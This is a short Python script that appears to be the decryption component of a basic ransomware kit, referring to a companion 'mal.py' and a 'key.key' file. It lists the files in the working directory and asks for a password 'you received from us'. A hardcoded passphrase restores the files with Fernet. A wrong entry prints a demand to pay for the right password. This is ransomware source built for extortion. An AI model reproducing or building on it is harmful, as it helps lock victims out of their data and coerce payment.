import os
from cryptography.fernet import Fernet

allfiles=[]
for file in os.listdir():
    if file=="mal.py" or file=="key.key" or file=="decrypt.py":
        continue
    if os.path.isfile(file):
        allfiles.append(file)
print(allfiles)

with open("key.key","rb") as key:
    password=key.read()
passphrase="C@P74!N"
userpass=input("Enter the password that you received from us:")
if userpass==passphrase:
    for file in allfiles:
          with open(file,"rb") as thefile:
                contents=thefile.read()
          content_decr=Fernet(password).decrypt(contents)
          with open(file,"wb") as thefile:
                thefile.write(content_decr)
                print("You got your files back")
else:
    print("Wrong password!Pay to receive the right pass")
